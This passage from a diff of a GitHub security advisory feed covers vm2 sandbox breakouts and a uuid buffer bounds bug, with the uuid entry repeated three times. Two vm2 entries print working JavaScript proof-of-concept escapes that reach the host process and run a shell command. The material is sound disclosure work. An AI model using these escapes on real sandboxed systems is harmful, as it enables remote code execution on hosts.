-<li><a href="https://github.com/patriksimek/vm2/commit/4cb82cc94d9bb6c9a918b45f8c6790c32a5e913f">https://github.com/patriksimek/vm2/commit/4cb82cc94d9bb6c9a918b45f8c6790c32a5e913f</a></li>
-<li><a href="https://github.com/patriksimek/vm2/commit/7395c3a4b01d302e55271c87dbeb44d6b83b81ca">https://github.com/patriksimek/vm2/commit/7395c3a4b01d302e55271c87dbeb44d6b83b81ca</a></li>
-<li><a href="https://github.com/patriksimek/vm2/commit/792e16d56ee429ab19e284ed9c545f5e4694fb7d">https://github.com/patriksimek/vm2/commit/792e16d56ee429ab19e284ed9c545f5e4694fb7d</a></li>
-<li><a href="https://github.com/patriksimek/vm2/commit/d715dd88c5aec5bbb4dce03ddf7c3eb3791d0338">https://github.com/patriksimek/vm2/commit/d715dd88c5aec5bbb4dce03ddf7c3eb3791d0338</a></li>
-<li><a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.0">https://github.com/patriksimek/vm2/releases/tag/v3.11.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-55hx-c926-fr95">https://github.com/advisories/GHSA-55hx-c926-fr95</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-55hx-c926-fr95</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-05-05T16:33:45.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[vm2] VM2 Has Sandbox Breakout Through Inspect Function]]></title>
-        <id>https://github.com/advisories/GHSA-v37h-5mfm-c47c</id>
-        <link href="https://github.com/advisories/GHSA-v37h-5mfm-c47c"/>
-        <updated>2026-05-05T16:33:18.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>VM2 suffers from a sandbox breakout vulnerability through the <code>inspect</code> function. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.</p>
-<h3 id="details">Details</h3>
-<p>The node <code>inspect</code> method allows to log details of objects. To get to the details, the implementation unwraps proxies. The unwrapped values can be extracted using the <code>this.seen</code> of the <code>stylize</code> function. This allows to get access to the internal proxy handler of VM2 which contains the sandbox object. Since the access to the handler is itself wrapped by a VM2 proxy, accessing the sandbox object in the proxy handler will result in a wrapped sandbox object given into the sandbox. This allows to write a wrapped host object to the wrapped sandbox object and read the raw host object from the raw sandbox object bypassing the proxy bridge.</p>
-<h3 id="poc">PoC</h3>
-<pre><code class="language-js">const obj = {
-    subarray: Buffer.prototype.inspect,
-    slice: Buffer.prototype.slice,
-    hexSlice:()=&gt;'',
-    l:{__proto__: null}
-};
-
-obj.slice(20, {showHidden: true, showProxy: true, depth: 10, stylize(a) {
-    if (this.seen?.[1]?.objectWrapper) this.seen[1].objectWrapper().x = obj.slice;
-    return a;
-}});
-obj.l.x.constructor("return process")().mainModule.require('child_process').execSync('touch pwned');
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Attackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-v37h-5mfm-c47c">https://github.com/patriksimek/vm2/security/advisories/GHSA-v37h-5mfm-c47c</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24781">https://nvd.nist.gov/vuln/detail/CVE-2026-24781</a></li>
-<li><a href="https://github.com/patriksimek/vm2/commit/8d30d93213c1898b3e035298b89a814970dd1189">https://github.com/patriksimek/vm2/commit/8d30d93213c1898b3e035298b89a814970dd1189</a></li>
-<li><a href="https://github.com/patriksimek/vm2/commit/bdd3d15e57bc4ec5e70365cd79f7cb0256e5f88c">https://github.com/patriksimek/vm2/commit/bdd3d15e57bc4ec5e70365cd79f7cb0256e5f88c</a></li>
-<li><a href="https://github.com/patriksimek/vm2/commit/fd266d084e0a3322d0f71ba2a8dc4c96cd030228">https://github.com/patriksimek/vm2/commit/fd266d084e0a3322d0f71ba2a8dc4c96cd030228</a></li>
-<li><a href="https://github.com/patriksimek/vm2/releases/tag/v3.11.0">https://github.com/patriksimek/vm2/releases/tag/v3.11.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-v37h-5mfm-c47c">https://github.com/advisories/GHSA-v37h-5mfm-c47c</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v37h-5mfm-c47c</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-05-05T16:33:14.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[vm2] VM2 Has Sandbox Breakout Through Promise Species]]></title>
-        <id>https://github.com/advisories/GHSA-qvjj-29qf-hp7p</id>
-        <link href="https://github.com/advisories/GHSA-qvjj-29qf-hp7p"/>
-        <updated>2026-05-05T16:23:37.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The fix for <a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5">https://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5</a> is insufficient and can be circumvented allowing attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.</p>
-<h3 id="details">Details</h3>
-<p>The fix for <a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5">https://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5</a> introduced the function <code>resetPromiseSpecies</code> <a href="https://github.com/patriksimek/vm2/blob/4b009c2d4b1131c01810c1205e641d614c322a29/lib/setup-sandbox.js#L35C7-L39">https://github.com/patriksimek/vm2/blob/4b009c2d4b1131c01810c1205e641d614c322a29/lib/setup-sandbox.js#L35C7-L39</a>.
-This function changes the <code>species</code> property of promise objects back to a known value. However, it uses the function <code>[].includes</code> and <code>Object.defineProperty</code> which can be overewritten to prevent the species from being changed.</p>
-<h3 id="poc">PoC</h3>
-<p>The following code demonstrates this issue by aquiring the host process object and executing <code>touch pwned</code>.</p>
-<pre><code class="language-js">const {VM} = require("vm2");
-const vm = new VM();
-vm.run(`
-Object.defineProperty=()=&gt;{};
-async function fn() {
-    const e = new Error();
-    e.name = Symbol();
-    return e.stack;
-}
-p = fn();
-p.constructor = {
-    [Symbol.species]: class FakePromise {
-        constructor(executor) {
-            executor(
-                (x) =&gt; x,
-                (err) =&gt; { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); }
-            )
-        }
-    }
-};
-p.then();
-`);
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Attackers can perform Remote Code Execution under the assumption that the attacker can run arbitrary code execution inside the context of a vm2 sandbox.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5">https://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5</a></li>
-<li><a href="https://github.com/patriksimek/vm2/security/advisories/GHSA-qvjj-29qf-hp7p">https://github.com/patriksimek/vm2/security/advisories/GHSA-qvjj-29qf-hp7p</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24120">https://nvd.nist.gov/vuln/detail/CVE-2026-24120</a></li>
-<li><a href="https://github.com/patriksimek/vm2/releases/tag/v3.10.5">https://github.com/patriksimek/vm2/releases/tag/v3.10.5</a></li>
-<li><a href="https://github.com/advisories/GHSA-qvjj-29qf-hp7p">https://github.com/advisories/GHSA-qvjj-29qf-hp7p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qvjj-29qf-hp7p</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-05-05T16:23:35.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[uuid] uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided]]></title>
-        <id>https://github.com/advisories/GHSA-w5hq-g745-h8pq</id>
-        <link href="https://github.com/advisories/GHSA-w5hq-g745-h8pq"/>
-        <updated>2026-05-05T13:03:34.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>v3</code>, <code>v5</code>, and <code>v6</code> accept external output buffers but do not reject out-of-range writes (small <code>buf</code> or large <code>offset</code>).<br>By contrast, <code>v4</code>, <code>v1</code>, and <code>v7</code> explicitly throw <code>RangeError</code> on invalid bounds.</p>
-<p>This inconsistency allows <strong>silent partial writes</strong> into caller-provided buffers.</p>
-<h3 id="affected-code">Affected code</h3>
-<ul>
-<li><code>src/v35.ts</code> (<code>v3</code>/<code>v5</code> path) writes <code>buf[offset + i]</code> without bounds validation.</li>
-<li><code>src/v6.ts</code> writes <code>buf[offset + i]</code> without bounds validation.</li>
-</ul>
-<h3 id="reproducible-poc">Reproducible PoC</h3>
-<pre><code class="language-bash">cd /home/StrawHat/uuid
-npm ci
-npm run build
-
-node --input-type=module -e "
-import {v4,v5,v6} from './dist-node/index.js';
-const ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';
-for (const [name,fn] of [
-  ['v4',()=&gt;v4({},new Uint8Array(8),4)],
-  ['v5',()=&gt;v5('x',ns,new Uint8Array(8),4)],
-  ['v6',()=&gt;v6({},new Uint8Array(8),4)],
-]) {
-  try { fn(); console.log(name,'NO_THROW'); }
-  catch(e){ console.log(name,'THREW',e.name); }
-}"
-</code></pre>
-<p>Observed:</p>
-<ul>
-<li><code>v4 THREW RangeError</code></li>
-<li><code>v5 NO_THROW</code></li>
-<li><code>v6 NO_THROW</code></li>
-</ul>
-<p>Example partial overwrite evidence captured during audit:</p>
-<pre><code class="language-text">same true buf [
-  170, 170, 170, 170,
-   75, 224, 100,  63
-]
-v6 [
-  187, 187, 187, 187,
-   31,  19, 185,  64
-]
-</code></pre>
-<h3 id="security-impact">Security impact</h3>
-<ul>
-<li><strong>Primary</strong>: integrity/robustness issue (silent partial output).</li>
-<li>If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.</li>
-<li>In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.</li>
-</ul>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>Add the same guard used by <code>v4</code>/<code>v1</code>/<code>v7</code>:</p>
-<pre><code class="language-ts">if (offset &lt; 0 || offset + 16 &gt; buf.length) {
-  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);
-}
-</code></pre>
-<p>Apply to:</p>
-<ul>
-<li><code>src/v35.ts</code> (covers <code>v3</code> and <code>v5</code>)</li>
-<li><code>src/v6.ts</code></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq">https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq</a></li>
-<li><a href="https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34">https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34</a></li>
-<li><a href="https://github.com/uuidjs/uuid/releases/tag/v14.0.0">https://github.com/uuidjs/uuid/releases/tag/v14.0.0</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41907">https://nvd.nist.gov/vuln/detail/CVE-2026-41907</a></li>
-<li><a href="https://github.com/advisories/GHSA-w5hq-g745-h8pq">https://github.com/advisories/GHSA-w5hq-g745-h8pq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w5hq-g745-h8pq</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-22T20:53:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[uuid] uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided]]></title>
-        <id>https://github.com/advisories/GHSA-w5hq-g745-h8pq</id>
-        <link href="https://github.com/advisories/GHSA-w5hq-g745-h8pq"/>
-        <updated>2026-05-05T13:03:34.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>v3</code>, <code>v5</code>, and <code>v6</code> accept external output buffers but do not reject out-of-range writes (small <code>buf</code> or large <code>offset</code>).<br>By contrast, <code>v4</code>, <code>v1</code>, and <code>v7</code> explicitly throw <code>RangeError</code> on invalid bounds.</p>
-<p>This inconsistency allows <strong>silent partial writes</strong> into caller-provided buffers.</p>
-<h3 id="affected-code">Affected code</h3>
-<ul>
-<li><code>src/v35.ts</code> (<code>v3</code>/<code>v5</code> path) writes <code>buf[offset + i]</code> without bounds validation.</li>
-<li><code>src/v6.ts</code> writes <code>buf[offset + i]</code> without bounds validation.</li>
-</ul>
-<h3 id="reproducible-poc">Reproducible PoC</h3>
-<pre><code class="language-bash">cd /home/StrawHat/uuid
-npm ci
-npm run build
-
-node --input-type=module -e "
-import {v4,v5,v6} from './dist-node/index.js';
-const ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';
-for (const [name,fn] of [
-  ['v4',()=&gt;v4({},new Uint8Array(8),4)],
-  ['v5',()=&gt;v5('x',ns,new Uint8Array(8),4)],
-  ['v6',()=&gt;v6({},new Uint8Array(8),4)],
-]) {
-  try { fn(); console.log(name,'NO_THROW'); }
-  catch(e){ console.log(name,'THREW',e.name); }
-}"
-</code></pre>
-<p>Observed:</p>
-<ul>
-<li><code>v4 THREW RangeError</code></li>
-<li><code>v5 NO_THROW</code></li>
-<li><code>v6 NO_THROW</code></li>
-</ul>
-<p>Example partial overwrite evidence captured during audit:</p>
-<pre><code class="language-text">same true buf [
-  170, 170, 170, 170,
-   75, 224, 100,  63
-]
-v6 [
-  187, 187, 187, 187,
-   31,  19, 185,  64
-]
-</code></pre>
-<h3 id="security-impact">Security impact</h3>
-<ul>
-<li><strong>Primary</strong>: integrity/robustness issue (silent partial output).</li>
-<li>If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.</li>
-<li>In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.</li>
-</ul>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>Add the same guard used by <code>v4</code>/<code>v1</code>/<code>v7</code>:</p>
-<pre><code class="language-ts">if (offset &lt; 0 || offset + 16 &gt; buf.length) {
-  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);
-}
-</code></pre>
-<p>Apply to:</p>
-<ul>
-<li><code>src/v35.ts</code> (covers <code>v3</code> and <code>v5</code>)</li>
-<li><code>src/v6.ts</code></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq">https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq</a></li>
-<li><a href="https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34">https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34</a></li>
-<li><a href="https://github.com/uuidjs/uuid/releases/tag/v14.0.0">https://github.com/uuidjs/uuid/releases/tag/v14.0.0</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41907">https://nvd.nist.gov/vuln/detail/CVE-2026-41907</a></li>
-<li><a href="https://github.com/advisories/GHSA-w5hq-g745-h8pq">https://github.com/advisories/GHSA-w5hq-g745-h8pq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w5hq-g745-h8pq</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-22T20:53:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[uuid] uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided]]></title>
-        <id>https://github.com/advisories/GHSA-w5hq-g745-h8pq</id>
-        <link href="https://github.com/advisories/GHSA-w5hq-g745-h8pq"/>
-        <updated>2026-05-05T13:03:34.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>v3</code>, <code>v5</code>, and <code>v6</code> accept external output buffers but do not reject out-of-range writes (small <code>buf</code> or large <code>offset</code>).<br>By contrast, <code>v4</code>, <code>v1</code>, and <code>v7</code> explicitly throw <code>RangeError</code> on invalid bounds.</p>
-<p>This inconsistency allows <strong>silent partial writes</strong> into caller-provided buffers.</p>
-<h3 id="affected-code">Affected code</h3>
-<ul>
-<li><code>src/v35.ts</code> (<code>v3</code>/<code>v5</code> path) writes <code>buf[offset + i]</code> without bounds validation.</li>
-<li><code>src/v6.ts</code> writes <code>buf[offset + i]</code> without bounds validation.</li>
-</ul>
-<h3 id="reproducible-poc">Reproducible PoC</h3>
-<pre><code class="language-bash">cd /home/StrawHat/uuid
-npm ci
-npm run build
-
-node --input-type=module -e "
-import {v4,v5,v6} from './dist-node/index.js';
-const ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';
-for (const [name,fn] of [
-  ['v4',()=&gt;v4({},new Uint8Array(8),4)],
-  ['v5',()=&gt;v5('x',ns,new Uint8Array(8),4)],
-  ['v6',()=&gt;v6({},new Uint8Array(8),4)],
-]) {
-  try { fn(); console.log(name,'NO_THROW'); }
-  catch(e){ console.log(name,'THREW',e.name); }
-}"
-</code></pre>
-<p>Observed:</p>
-<ul>
-<li><code>v4 THREW RangeError</code></li>
-<li><code>v5 NO_THROW</code></li>
-<li><code>v6 NO_THROW</code></li>
-</ul>
-<p>Example partial overwrite evidence captured during audit:</p>
-<pre><code class="language-text">same true buf [
-  170, 170, 170, 170,
-   75, 224, 100,  63
-]
-v6 [
-  187, 187, 187, 187,
-   31,  19, 185,  64
-]
-</code></pre>
-<h3 id="security-impact">Security impact</h3>
-<ul>
-<li><strong>Primary</strong>: integrity/robustness issue (silent partial output).</li>
-<li>If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.</li>
-<li>In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.</li>
-</ul>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>Add the same guard used by <code>v4</code>/<code>v1</code>/<code>v7</code>:</p>
-<pre><code class="language-ts">if (offset &lt; 0 || offset + 16 &gt; buf.length) {
-  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);
-}
-</code></pre>
-<p>Apply to:</p>
-<ul>
-<li><code>src/v35.ts</code> (covers <code>v3</code> and <code>v5</code>)</li>
-<li><code>src/v6.ts</code></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq">https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq</a></li>
-<li><a href="https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34">https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34</a></li>
-<li><a href="https://github.com/uuidjs/uuid/releases/tag/v14.0.0">https://github.com/uuidjs/uuid/releases/tag/v14.0.0</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41907">https://nvd.nist.gov/vuln/detail/CVE-2026-41907</a></li>
-<li><a href="https://github.com/advisories/GHSA-w5hq-g745-h8pq">https://github.com/advisories/GHSA-w5hq-g745-h8pq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w5hq-g745-h8pq</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-22T20:53:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[uuid] Duplicate Advisory: uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided]]></title>
-        <id>https://github.com/advisories/GHSA-qmq6-f8pr-cx5x</id>
-        <link href="https://github.com/advisories/GHSA-qmq6-f8pr-cx5x"/>
-        <updated>2026-05-05T12:59:19.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of GHSA-w5hq-g745-h8pq. This link is maintained to preserve external references.</p>
-<h2 id="original-advisory">Original Advisory</h2>
-<p>uuid before 14.0.0 can make unexpected writes when external output buffers are used, and the UUID version is 3, 5, or 6. In particular, UUID version 4, which is very commonly used, is unaffected by this issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq">https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41988">https://nvd.nist.gov/vuln/detail/CVE-2026-41988</a></li>
-<li><a href="https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34">https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34</a></li>
-<li><a href="https://github.com/advisories/GHSA-qmq6-f8pr-cx5x">https://github.com/advisories/GHSA-qmq6-f8pr-cx5x</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qmq6-f8pr-cx5x</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-04-23T06:30:22.000Z</published>
     </entry>
 </feed>
